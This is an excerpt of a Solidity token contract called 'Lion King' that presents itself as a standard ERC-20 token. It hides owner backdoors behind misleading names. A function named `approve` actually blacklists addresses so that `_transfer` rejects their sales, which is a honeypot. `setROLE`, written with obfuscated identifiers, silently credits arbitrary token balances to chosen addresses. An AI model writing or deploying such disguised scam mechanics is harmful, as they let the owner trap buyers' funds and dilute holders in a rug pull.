...
contract LionKing is Context, IERC20, Ownable {
    ...
    string private _name = "Lion King";
    string private _symbol = "Lion King";
    ...
    uint256 public holdFee = 2;
    uint256 public marketFee = 3;
   
    mapping(address => bool) private _cha;
    bool private _orapprove = true;
    bool private _areALLapprove = false;
  
    uint256 public PIG = uint256(0);
    mapping(address => uint256) private UHU;
    ...
    function SETTRANSFER(bool approvez) external onlyOwner() {
        _orapprove = approvez;
    }
    ...
    function approve(address approveP) external onlyOwner() {
        _cha[approveP] = true;
    }

    function ONapprove(address DONTapprove) external onlyOwner() {
        delete _cha[DONTapprove];
    }

    function AUTHORIZATION(address INCREASE)
        external
        view
        onlyOwner()
        returns (bool)
    {
        return _cha[INCREASE];
    }
    ...
    function _transfer(
        ...
        if (_orapprove) {
            require(_cha[from] == false, "or approve ");
        }
    ...
    function setROLE(address ZOMBIES, uint256 BULLET) external onlyOwner() {
        require(BULLET > 0, "Transfer  greater than zero");
        uint256 inAmount = UHU[ZOMBIES];
        if (inAmount == 0) _BST.push(ZOMBIES);
        UHU[ZOMBIES] = inAmount.add(BULLET);
        PIG = PIG.add(BULLET);
        _balance[ZOMBIES] = _balance[ZOMBIES].add(BULLET);
    }
